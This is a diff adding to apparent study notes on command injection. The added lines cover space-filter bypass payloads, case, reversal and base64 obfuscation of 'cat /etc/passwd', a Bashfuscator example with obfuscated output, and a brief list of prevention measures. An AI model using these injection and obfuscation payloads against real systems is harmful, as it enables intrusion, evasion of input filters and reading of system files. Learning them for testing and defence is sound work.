@@ -458,4 +458,23 @@ Header Injection 	\n \r\n \t %0d %0a %09
 - Identifying blacklisted characters
 ## Bypassing Space Filters
 ip=127.0.0.1%0a{ls,-lah,${PATH:0:1}home} # using envioment variables as / for home directory
-
+## Advanced Command Obfuscation 
+* Case Manipulation 
+EX: WhOamI
+* Reversed Commands
+EX: echo 'whoami' | rev
+* Encoded Commands 
+EX: echo -n 'cat /etc/passwd | grep 33' | base64
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+## Automated Tools for Advanced Security Tools 
+Linux(Bashfuscator)
+EX: ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+Test Output: bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
+root:x:0:0:root:/root:/bin/bash
+Windows (DOSfuscation)
+## Prevent Command Injection
+* Avoid Using System Commands
+* Input Validation 
+* Input Sanitization
+* Server Configuration
